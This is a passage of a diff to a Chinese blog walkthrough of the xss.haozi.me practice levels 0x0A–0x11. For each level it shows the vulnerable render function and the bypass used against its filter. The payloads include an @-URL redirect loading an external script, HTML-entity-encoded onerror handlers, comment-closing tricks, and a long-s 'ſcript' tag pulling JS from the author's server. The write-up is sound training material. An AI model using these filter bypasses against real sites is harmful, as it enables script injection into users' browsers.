class="hljs-params">s</span>) </span>&#123;<br>    <span class="hljs-keyword">return</span> s.replace(<span class="hljs-regexp">/&amp;/g</span>, <span class="hljs-string">&#x27;&amp;amp;&#x27;</span>)<br>            .replace(<span class="hljs-regexp">/&#x27;/g</span>, <span class="hljs-string">&#x27;&amp;#39;&#x27;</span>)<br>            .replace(<span class="hljs-regexp">/&quot;/g</span>, <span class="hljs-string">&#x27;&amp;quot;&#x27;</span>)<br>            .replace(<span class="hljs-regexp">/&lt;/g</span>, <span class="hljs-string">&#x27;&amp;lt;&#x27;</span>)<br>            .replace(<span class="hljs-regexp">/&gt;/g</span>, <span class="hljs-string">&#x27;&amp;gt;&#x27;</span>)<br>            .replace(<span class="hljs-regexp">/\//g</span>, <span class="hljs-string">&#x27;&amp;#x2f&#x27;</span>)<br>  &#125;<br><br>  <span class="hljs-keyword">const</span> domainRe = <span class="hljs-regexp">/^https?:\/\/www\.segmentfault\.com/</span><br>  <span class="hljs-keyword">if</span> (domainRe.test(input)) &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">`&lt;script src=&quot;<span class="hljs-subst">$&#123;escapeHtml(input)&#125;</span>&quot;&gt;&lt;/script&gt;`</span><br>  &#125;<br>  <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;Invalid URL&#x27;</span><br>&#125;<br><br>前端代码:<br>Invalid URL<br></code></pre></td></tr></table></figure>
+<h2 id="0x0A"><a href="#0x0A" class="headerlink" title="0x0A"></a>0x0A</h2><div class="code-wrapper"><pre><code class="hljs javascript">服务器端代码:
+<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">render</span> (<span class="hljs-params">input</span>) </span>&#123;
+  <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">escapeHtml</span>(<span class="hljs-params">s</span>) </span>&#123;
+    <span class="hljs-keyword">return</span> s.replace(<span class="hljs-regexp">/&amp;/g</span>, <span class="hljs-string">&#x27;&amp;amp;&#x27;</span>)
+            .replace(<span class="hljs-regexp">/&#x27;/g</span>, <span class="hljs-string">&#x27;&amp;#39;&#x27;</span>)
+            .replace(<span class="hljs-regexp">/&quot;/g</span>, <span class="hljs-string">&#x27;&amp;quot;&#x27;</span>)
+            .replace(<span class="hljs-regexp">/&lt;/g</span>, <span class="hljs-string">&#x27;&amp;lt;&#x27;</span>)
+            .replace(<span class="hljs-regexp">/&gt;/g</span>, <span class="hljs-string">&#x27;&amp;gt;&#x27;</span>)
+            .replace(<span class="hljs-regexp">/\//g</span>, <span class="hljs-string">&#x27;&amp;#x2f&#x27;</span>)
+  &#125;
+
+  <span class="hljs-keyword">const</span> domainRe = <span class="hljs-regexp">/^https?:\/\/www\.segmentfault\.com/</span>
+  <span class="hljs-keyword">if</span> (domainRe.test(input)) &#123;
+    <span class="hljs-keyword">return</span> <span class="hljs-string">`&lt;script src=&quot;<span class="hljs-subst">$&#123;escapeHtml(input)&#125;</span>&quot;&gt;&lt;/script&gt;`</span>
+  &#125;
+  <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;Invalid URL&#x27;</span>
+&#125;
+
+前端代码:
+Invalid URL</code></pre></div>
 
 <p>和<code>0x09</code>一样需要制定的Url开头,但是本题还将”&amp;、`、”、&lt;、&gt;、&quot;这些标点符号全部转换成HTML实体编码.因此本题不能通过闭合绕过,需要用到HTML的@特性,请求Url: <a target="_blank" rel="noopener" href="http://www.google.com@www.youtube.com/">www.google.com@www.youtube.com</a> 最后访问到是 YouTube , Google相当于做了一次跳转  </p>
-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs javascript">payload:<br>https:<span class="hljs-comment">//www.segmentfault.com@xss.haozi.me/j.js</span><br></code></pre></td></tr></table></figure>
+<div class="code-wrapper"><pre><code class="hljs javascript">payload:
+https:<span class="hljs-comment">//www.segmentfault.com@xss.haozi.me/j.js</span></code></pre></div>
 
 <p><code>注意:由于Chrome浏览器的一些安全机制,无法正常请求这个Url,所以这题改为使用Firefox浏览器</code></p>
 <p><img src="https://raw.githubusercontent.com/MokYan/Figurebed/master/img/xss-11.png" srcset="/Study/img/loading.gif" lazyload></p>
@@ -356,71 +473,193 @@
 
 
 
-<h2 id="0x0B"><a href="#0x0B" class="headerlink" title="0x0B"></a>0x0B</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs javascript">服务器端代码:<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">render</span> (<span class="hljs-params">input</span>) </span>&#123;<br>  input = input.toUpperCase()<br>  <span class="hljs-keyword">return</span> <span class="hljs-string">`&lt;h1&gt;<span class="hljs-subst">$&#123;input&#125;</span>&lt;/h1&gt;`</span><br>&#125;<br><br>前端代码:<br><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span></span><br></code></pre></td></tr></table></figure>
+<h2 id="0x0B"><a href="#0x0B" class="headerlink" title="0x0B"></a>0x0B</h2><div class="code-wrapper"><pre><code class="hljs javascript">服务器端代码:
+<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">render</span> (<span class="hljs-params">input</span>) </span>&#123;
+  input = input.toUpperCase()
+  <span class="hljs-keyword">return</span> <span class="hljs-string">`&lt;h1&gt;<span class="hljs-subst">$&#123;input&#125;</span>&lt;/h1&gt;`</span>
+&#125;
+
+前端代码:
+<span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span></span></code></pre></div>
 
 <p>这关使用了<code>toUpperCase</code>函数对输入的字符进行大写转换,HTML标签不区分大小写,但是JavaScript代码区分,也就是说<code>ALERT</code>不能执行.但是可以将JavaScript代码进行<code>uniocde</code>编码进行绕过</p>
 <p><code>注意Unicode编码有两种结果,一个是中文转Unicode结果是\u开头的,另一个是ASCII转Unicode结果是&amp;#开头的.这里用ASCII转Unicode</code></p>
-<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs html">payload:<br><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;&quot;</span> <span class="hljs-attr">onerror</span>=<span class="hljs-string">&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#49;&amp;#41;</span>&gt;</span><br></code></pre></td></tr></table></figure>
+<div class="code-wrapper"><pre><code class="hljs html">payload:
+<span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;&quot;</span> <span class="hljs-attr">onerror</span>=<span class="hljs-string">&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#49;&amp;#41;</span>&gt;</span></code></pre></div>
 
 <p><img src="https://raw.githubusercontent.com/MokYan/Figurebed/master/img/xss-12.png" srcset="/Study/img/loading.gif" lazyload></p>
 <br>
 
-<h2 id="0x0C"><a href="#0x0C" class="headerlink" title="0x0C"></a>0x0C</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs javascript">服务器端代码:<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">render</span> (<span class="hljs-params">input</span>) </span>&#123;<br>  input = input.replace(<span class="hljs-regexp">/script/ig</span>, <span class="hljs-string">&#x27;&#x27;</span>)<br>  input = input.toUpperCase()<br>  <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;&lt;h1&gt;&#x27;</span> + input + <span class="hljs-string">&#x27;&lt;/h1&gt;&#x27;</span><br>&#125;<br><br>前端代码:<br><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span></span><br></code></pre></td></tr></table></figure>
+<h2 id="0x0C"><a href="#0x0C" class="headerlink" title="0x0C"></a>0x0C</h2><div class="code-wrapper"><pre><code class="hljs javascript">服务器端代码:
+<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">render</span> (<span class="hljs-params">input</span>) </span>&#123;
+  input = input.replace(<span class="hljs-regexp">/script/ig</span>, <span class="hljs-string">&#x27;&#x27;</span>)
+  input = input.toUpperCase()
+  <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;&lt;h1&gt;&#x27;</span> + input + <span class="hljs-string">&#x27;&lt;/h1&gt;&#x27;</span>
+&#125;
+
+前端代码:
+<span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span></span></code></pre></div>
 
 <p>服务器使用正则表达式将<code>script</code>替换成空,且对输入的字符进行大写转换,使用<code>0x0B</code>的payload即可,不要相信网上用外部引入<code>j.js</code>,因为转为大写不存在这个文件</p>
-<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs html">payload:<br><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;&quot;</span> <span class="hljs-attr">onerror</span>=<span class="hljs-string">&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#49;&amp;#41;</span>&gt;</span><br></code></pre></td></tr></table></figure>
+<div class="code-wrapper"><pre><code class="hljs html">payload:
+<span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;&quot;</span> <span class="hljs-attr">onerror</span>=<span class="hljs-string">&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#49;&amp;#41;</span>&gt;</span></code></pre></div>
 
 <p><img src="https://raw.githubusercontent.com/MokYan/Figurebed/master/img/xss-13.png" srcset="/Study/img/loading.gif" lazyload></p>
 <br>
 
-<h2 id="0x0D"><a href="#0x0D" class="headerlink" title="0x0D"></a>0x0D</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs javascript">服务器端代码:<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">render</span> (<span class="hljs-params">input</span>) </span>&#123;<br>  input = input.replace(<span class="hljs-regexp">/[&lt;/&quot;&#x27;]/g</span>, <span class="hljs-string">&#x27;&#x27;</span>)<br>  <span class="hljs-keyword">return</span> <span class="hljs-string">`</span><br><span class="hljs-string">    &lt;script&gt;</span><br><span class="hljs-string">          // alert(&#x27;<span class="hljs-subst">$&#123;input&#125;</span>&#x27;)</span><br><span class="hljs-string">    &lt;/script&gt;</span><br><span class="hljs-string">  `</span><br>&#125;<br><br>前端代码:<br><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript"></span></span><br><span class="javascript"><span class="xml">          <span class="hljs-comment">// alert(&#x27;&#x27;)</span></span></span><br><span class="javascript"><span class="xml">    </span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br></code></pre></td></tr></table></figure>
+<h2 id="0x0D"><a href="#0x0D" class="headerlink" title="0x0D"></a>0x0D</h2><div class="code-wrapper"><pre><code class="hljs javascript">服务器端代码:
+<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">render</span> (<span class="hljs-params">input</span>) </span>&#123;
+  input = input.replace(<span class="hljs-regexp">/[&lt;/&quot;&#x27;]/g</span>, <span class="hljs-string">&#x27;&#x27;</span>)
+  <span class="hljs-keyword">return</span> <span class="hljs-string">`</span>
+<span class="hljs-string">    &lt;script&gt;</span>
+<span class="hljs-string">          // alert(&#x27;<span class="hljs-subst">$&#123;input&#125;</span>&#x27;)</span>
+<span class="hljs-string">    &lt;/script&gt;</span>
+<span class="hljs-string">  `</span>
+&#125;
+
+前端代码:
+<span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript"></span></span>
+<span class="javascript"><span class="xml">          <span class="hljs-comment">// alert(&#x27;&#x27;)</span></span></span>
+<span class="javascript"><span class="xml">    </span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span></code></pre></div>
 
 <p>服务器使用正则表达式对 <code>&lt; / &quot; &#39; </code>进行过滤替换成空,且在输入的地方进行单行注释,因为是单行注释所以换行就能绕过,但是由于后面接着<code>&#39;)</code>,所以必须屏蔽或闭合才能执行JavaScript代码,根据服务器端代码,只能使用 <code>--&gt;</code>来进行注释</p>
-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs javascript">payload:(注意有一行空行)<br><br>alert(<span class="hljs-number">1</span>)<br>--&gt;<br></code></pre></td></tr></table></figure>
+<div class="code-wrapper"><pre><code class="hljs javascript">payload:(注意有一行空行)
+
+alert(<span class="hljs-number">1</span>)
+--&gt;</code></pre></div>
 
 <p><img src="https://raw.githubusercontent.com/MokYan/Figurebed/master/img/xss-14.png" srcset="/Study/img/loading.gif" lazyload></p>
 <br>
 
-<h2 id="0x0E-巨坑"><a href="#0x0E-巨坑" class="headerlink" title="0x0E(巨坑!!!)"></a>0x0E(巨坑!!!)</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs javascript">服务器端代码:<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">render</span> (<span class="hljs-params">input</span>) </span>&#123;<br>  input = input.replace(<span class="hljs-regexp">/&lt;([a-zA-Z])/g</span>, <span class="hljs-string">&#x27;&lt;_$1&#x27;</span>)<br>  input = input.toUpperCase()<br>  <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;&lt;h1&gt;&#x27;</span> + input + <span class="hljs-string">&#x27;&lt;/h1&gt;&#x27;</span><br>&#125;<br><br>前端代码:<br><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span></span><br></code></pre></td></tr></table></figure>
+<h2 id="0x0E-巨坑"><a href="#0x0E-巨坑" class="headerlink" title="0x0E(巨坑!!!)"></a>0x0E(巨坑!!!)</h2><div class="code-wrapper"><pre><code class="hljs javascript">服务器端代码:
+<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">render</span> (<span class="hljs-params">input</span>) </span>&#123;
+  input = input.replace(<span class="hljs-regexp">/&lt;([a-zA-Z])/g</span>, <span class="hljs-string">&#x27;&lt;_$1&#x27;</span>)
+  input = input.toUpperCase()
+  <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;&lt;h1&gt;&#x27;</span> + input + <span class="hljs-string">&#x27;&lt;/h1&gt;&#x27;</span>
+&#125;
+
+前端代码:
+<span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span></span></code></pre></div>
 
 <p>服务器使用正则表达式对以<code>&lt;</code>开头后面接大小写字母进行替换成<code>&lt;_</code>加大写字母,导致无法使用<code>script</code>标签,且大写的JavaScript代码无法执行,没有丝毫头绪,翻了下官方WP,了解到一些骚知识</p>
 <p><code>ſ</code>是古英语中的s的写法, 转成大写是正常的<code>S</code></p>
 <p><code>这也太骚了吧!!!,玩CTF吗???脑洞这么大</code></p>
 <p><code>又是一个坑!!!,官方WP是引入j.js 由于大写转换后变成J.JS.文件不存在访问404.只能去自己的服务器写脚本引入自己的js文件</code></p>
-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs javascript">payload:<br>&lt;ſcript src=<span class="hljs-string">&quot;http://自己的服务器/ALERT.JS&quot;</span>&gt;&lt;/script&gt;<br><br>ALERT.JS:<br>alert(<span class="hljs-number">1</span>)<br></code></pre></td></tr></table></figure>
+<div class="code-wrapper"><pre><code class="hljs javascript">payload:
+&lt;ſcript src=<span class="hljs-string">&quot;http://自己的服务器/ALERT.JS&quot;</span>&gt;&lt;/script&gt;
+
+ALERT.JS:
+alert(<span class="hljs-number">1</span>)</code></pre></div>
 
 <p><img src="https://raw.githubusercontent.com/MokYan/Figurebed/master/img/xss-15.png" srcset="/Study/img/loading.gif" lazyload></p>
 <br>
 
-<h2 id="0x0F"><a href="#0x0F" class="headerlink" title="0x0F"></a>0x0F</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs javascript">服务器端代码:<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">render</span> (<span class="hljs-params">input</span>) </span>&#123;<br>  <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">escapeHtml</span>(<span class="hljs-params">s</span>) </span>&#123;<br>    <span class="hljs-keyword">return</span> s.replace(<span class="hljs-regexp">/&amp;/g</span>, <span class="hljs-string">&#x27;&amp;amp;&#x27;</span>)<br>            .replace(<span class="hljs-regexp">/&#x27;/g</span>, <span class="hljs-string">&#x27;&amp;#39;&#x27;</span>)<br>            .replace(<span class="hljs-regexp">/&quot;/g</span>, <span class="hljs-string">&#x27;&amp;quot;&#x27;</span>)<br>            .replace(<span class="hljs-regexp">/&lt;/g</span>, <span class="hljs-string">&#x27;&amp;lt;&#x27;</span>)<br>            .replace(<span class="hljs-regexp">/&gt;/g</span>, <span class="hljs-string">&#x27;&amp;gt;&#x27;</span>)<br>            .replace(<span class="hljs-regexp">/\//g</span>, <span class="hljs-string">&#x27;&amp;#x2f;&#x27;</span>)<br>  &#125;<br>  <span class="hljs-keyword">return</span> <span class="hljs-string">`&lt;img src onerror=&quot;console.error(&#x27;<span class="hljs-subst">$&#123;escapeHtml(input)&#125;</span>&#x27;)&quot;&gt;`</span><br>&#125;<br><br>前端代码:<br><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span> <span class="hljs-attr">onerror</span>=<span class="hljs-string">&quot;console.error(&#x27;&#x27;)&quot;</span>&gt;</span></span><br></code></pre></td></tr></table></figure>
+<h2 id="0x0F"><a href="#0x0F" class="headerlink" title="0x0F"></a>0x0F</h2><div class="code-wrapper"><pre><code class="hljs javascript">服务器端代码:
+<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">render</span> (<span class="hljs-params">input</span>) </span>&#123;
+  <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">escapeHtml</span>(<span class="hljs-params">s</span>) </span>&#123;
+    <span class="hljs-keyword">return</span> s.replace(<span class="hljs-regexp">/&amp;/g</span>, <span class="hljs-string">&#x27;&amp;amp;&#x27;</span>)
+            .replace(<span class="hljs-regexp">/&#x27;/g</span>, <span class="hljs-string">&#x27;&amp;#39;&#x27;</span>)
+            .replace(<span class="hljs-regexp">/&quot;/g</span>, <span class="hljs-string">&#x27;&amp;quot;&#x27;</span>)
+            .replace(<span class="hljs-regexp">/&lt;/g</span>, <span class="hljs-string">&#x27;&amp;lt;&#x27;</span>)
+            .replace(<span class="hljs-regexp">/&gt;/g</span>, <span class="hljs-string">&#x27;&amp;gt;&#x27;</span>)
+            .replace(<span class="hljs-regexp">/\//g</span>, <span class="hljs-string">&#x27;&amp;#x2f;&#x27;</span>)
+  &#125;
+  <span class="hljs-keyword">return</span> <span class="hljs-string">`&lt;img src onerror=&quot;console.error(&#x27;<span class="hljs-subst">$&#123;escapeHtml(input)&#125;</span>&#x27;)&quot;&gt;`</span>
+&#125;
+
+前端代码:
+<span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span> <span class="hljs-attr">onerror</span>=<span class="hljs-string">&quot;console.error(&#x27;&#x27;)&quot;</span>&gt;</span></span></code></pre></div>
 
 <p>服务器对<code>&amp; &#39; &quot; &lt; &gt; \</code>进行HTML实体编码,但是在HTML标签里面使用HTML实体编码没啥用,因为浏览器会解析HTML实体编码,所以将<code>onerror的console.error闭合</code>绕过就行了</p>
-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs javascript">payload:<br><span class="hljs-string">&#x27;)alert(&#x27;</span><span class="hljs-number">1</span><br></code></pre></td></tr></table></figure>
+<div class="code-wrapper"><pre><code class="hljs javascript">payload:
+<span class="hljs-string">&#x27;)alert(&#x27;</span><span class="hljs-number">1</span></code></pre></div>
 
 <p><img src="https://raw.githubusercontent.com/MokYan/Figurebed/master/img/xss-16.png" srcset="/Study/img/loading.gif" lazyload></p>
 <br>
 
-<h2 id="0x10"><a href="#0x10" class="headerlink" title="0x10"></a>0x10</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs javascript">服务器端代码:<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">render</span> (<span class="hljs-params">input</span>) </span>&#123;<br>  <span class="hljs-keyword">return</span> <span class="hljs-string">`</span><br><span class="hljs-string">&lt;script&gt;</span><br><span class="hljs-string">  window.data = <span class="hljs-subst">$&#123;input&#125;</span></span><br><span class="hljs-string">&lt;/script&gt;</span><br><span class="hljs-string">  `</span><br>&#125;<br><br>前端代码:<br><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript"></span></span><br><span class="javascript"><span class="xml">  <span class="hljs-built_in">window</span>.data =</span></span><br><span class="javascript"><span class="xml"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br></code></pre></td></tr></table></figure>
+<h2 id="0x10"><a href="#0x10" class="headerlink" title="0x10"></a>0x10</h2><div class="code-wrapper"><pre><code class="hljs javascript">服务器端代码:
+<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">render</span> (<span class="hljs-params">input</span>) </span>&#123;
+  <span class="hljs-keyword">return</span> <span class="hljs-string">`</span>
+<span class="hljs-string">&lt;script&gt;</span>
+<span class="hljs-string">  window.data = <span class="hljs-subst">$&#123;input&#125;</span></span>
+<span class="hljs-string">&lt;/script&gt;</span>
+<span class="hljs-string">  `</span>
+&#125;
+
+前端代码:
+<span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript"></span></span>
+<span class="javascript"><span class="xml">  <span class="hljs-built_in">window</span>.data =</span></span>
+<span class="javascript"><span class="xml"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span></code></pre></div>
 
 <p>送分题???没有任何过滤,能直接执行alert(1)</p>
-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs javascript">payload:<br>alert(<span class="hljs-number">1</span>)<br></code></pre></td></tr></table></figure>
+<div class="code-wrapper"><pre><code class="hljs javascript">payload:
+alert(<span class="hljs-number">1</span>)</code></pre></div>
 
 <p><img src="https://raw.githubusercontent.com/MokYan/Figurebed/master/img/xss-17.png" srcset="/Study/img/loading.gif" lazyload></p>
 <br>
 
-<h2 id="0x11"><a href="#0x11" class="headerlink" title="0x11"></a>0x11</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs javascript">服务器端代码:<br><span class="hljs-comment">// from alf.nu</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">render</span> (<span class="hljs-params">s</span>) </span>&#123;<br>  <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">escapeJs</span> (<span class="hljs-params">s</span>) </span>&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">String</span>(s)<br>            .replace(<span class="hljs-regexp">/\\/g</span>, <span class="hljs-string">&#x27;\\\\&#x27;</span>)<br>            .replace(<span class="hljs-regexp">/&#x27;/g</span>, <span class="hljs-string">&#x27;\\\&#x27;&#x27;</span>)<br>            .replace(<span class="hljs-regexp">/&quot;/g</span>, <span class="hljs-string">&#x27;\\&quot;&#x27;</span>)<br>            .replace(<span class="hljs-regexp">/`/g</span>, <span class="hljs-string">&#x27;\\`&#x27;</span>)<br>            .replace(<span class="hljs-regexp">/&lt;/g</span>, <span class="hljs-string">&#x27;\\74&#x27;</span>)<br>            .replace(<span class="hljs-regexp">/&gt;/g</span>, <span class="hljs-string">&#x27;\\76&#x27;</span>)<br>            .replace(<span class="hljs-regexp">/\//g</span>, <span class="hljs-string">&#x27;\\/&#x27;</span>)<br>            .replace(<span class="hljs-regexp">/\n/g</span>, <span class="hljs-string">&#x27;\\n&#x27;</span>)<br>            .replace(<span class="hljs-regexp">/\r/g</span>, <span class="hljs-string">&#x27;\\r&#x27;</span>)<br>            .replace(<span class="hljs-regexp">/\t/g</span>, <span class="hljs-string">&#x27;\\t&#x27;</span>)<br>            .replace(<span class="hljs-regexp">/\f/g</span>, <span class="hljs-string">&#x27;\\f&#x27;</span>)<br>            .replace(<span class="hljs-regexp">/\v/g</span>, <span class="hljs-string">&#x27;\\v&#x27;</span>)<br>            <span class="hljs-comment">// .replace(/\b/g, &#x27;\\b&#x27;)</span><br>            .replace(<span class="hljs-regexp">/\0/g</span>, <span class="hljs-string">&#x27;\\0&#x27;</span>)<br>  &#125;<br>  s = escapeJs(s)<br>  <span class="hljs-keyword">return</span> <span class="hljs-string">`</span><br><span class="hljs-string">&lt;script&gt;</span><br><span class="hljs-string">  var url = &#x27;javascript:console.log(&quot;<span class="hljs-subst">$&#123;s&#125;</span>&quot;)&#x27;</span><br><span class="hljs-string">  var a = document.createElement(&#x27;a&#x27;)</span><br><span class="hljs-string">  a.href = url</span><br><span class="hljs-string">  document.body.appendChild(a)</span><br><span class="hljs-string">  a.click()</span><br><span class="hljs-string">&lt;/script&gt;</span><br><span class="hljs-string">`</span><br>&#125;<br><br>前端代码:<br><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript"></span></span><br><span class="javascript"><span class="xml">  <span class="hljs-keyword">var</span> url = <span class="hljs-string">&#x27;javascript:console.log(&quot;&quot;)&#x27;</span></span></span><br><span class="javascript"><span class="xml">  <span class="hljs-keyword">var</span> a = <span class="hljs-built_in">document</span>.createElement(<span class="hljs-string">&#x27;a&#x27;</span>)</span></span><br><span class="javascript"><span class="xml">  a.href = url</span></span><br><span class="javascript"><span class="xml">  <span class="hljs-built_in">document</span>.body.appendChild(a)</span></span><br><span class="javascript"><span class="xml">  a.click()</span></span><br><span class="javascript"><span class="xml"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br></code></pre></td></tr></table></figure>
+<h2 id="0x11"><a href="#0x11" class="headerlink" title="0x11"></a>0x11</h2><div class="code-wrapper"><pre><code class="hljs javascript">服务器端代码:
+<span class="hljs-comment">// from alf.nu</span>
+<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">render</span> (<span class="hljs-params">s</span>) </span>&#123;
+  <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">escapeJs</span> (<span class="hljs-params">s</span>) </span>&#123;
